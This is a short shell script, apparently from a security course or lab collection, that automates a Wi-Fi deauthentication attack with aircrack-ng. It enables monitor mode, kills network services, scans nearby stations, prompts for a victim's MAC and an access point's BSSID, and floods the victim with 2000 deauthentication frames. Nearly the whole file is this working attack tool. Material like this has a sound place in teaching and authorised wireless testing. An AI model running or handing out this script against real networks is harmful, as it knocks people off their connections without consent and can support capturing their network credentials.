#
#   Copyright (C) 2018 -- 2023  Zachary A. Kissel
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
#!/bin/sh

# Global configuration variables.

ETHERDEV=wlp2s0
MONDEVICE=wlp2s0mon

usage()
{
  echo "Usage: deauth-attack <channel>"
  exit 1
}

instruct()
{
  echo "This tool uses aircrack to launch a deauthentication attack for a victim."
  echo "A scan of available stations will run for 20 seconds and then ask you"
  echo "for a victim station MAC and the associated AP MAC."
  echo
}

check_required()
{
        which airmon-ng &> /dev/null
        if [ $? -ne 0 ]; then
                echo "Error: aircrack not installed."
                exit 1
        fi
}

cleanup()
{
  echo "*** Cleaning up ***"
  echo
  airmon-ng stop $MONDEVICE
  systemctl start NetworkManager  # Re-enable network manager.
}

ctrl_c()
{
  cleanup
}

# Print the usage message if we don't have the correct number of
# arguments.
if [ $# -ne 1 ]; then
  usage
fi

# Make sure we are running as root -- we need to be root to make the necessary
# changes to the network stack.
uid=`id -u`
if [ $uid -ne 0 ]; then
  echo "Must be root to run this script."
  exit 1
fi

# Check for the required tools.
check_required

# Print the instructions.
instruct

# Show instructions.
read dummy

# Put the wifi card in promiscuous mode.
echo "airmon-ng start ${ETHERDEV}"
airmon-ng start $ETHERDEV

if [ $? -ne 0 ]; then
  echo "Error: Could not put ${ETHERDEV} into promiscous mode."
  exit 1
fi

# Install a new trap handler. This signal handler must be installed no earlier
# otherwise we can not guarantee that the ip_forwarding has been affected.
trap ctrl_c INT

# Stop all of the services
airmon-ng check-kill

# Let's do a quick scan and show the user the results.
echo "Starting airodum-ng ${MONDEVICE}"
airodump-ng $MONDEVICE -c $1 &
sleep 20
pkill airodump-ng

read DUMMY  # Just read a dummy character.

# Prompt for victim MAC address.
#VICTIM_MAC=""
#while [ VICTIM_MAC = "" ]; do
  echo "What is the MAC address of the victim (STATION)?"
  read VICTIM_MAC
#done

# Prompt for the station MAC address.
echo "What is the MAC address of the AP (BSSID)?"
read AP_MAC

# Use aireplay-ng to send a deauthentication packet to the victim.
aireplay-ng --deauth 2000 -a $AP_MAC -c $VICTIM_MAC $MONDEVICE

cleanup # we're done; cleanup.
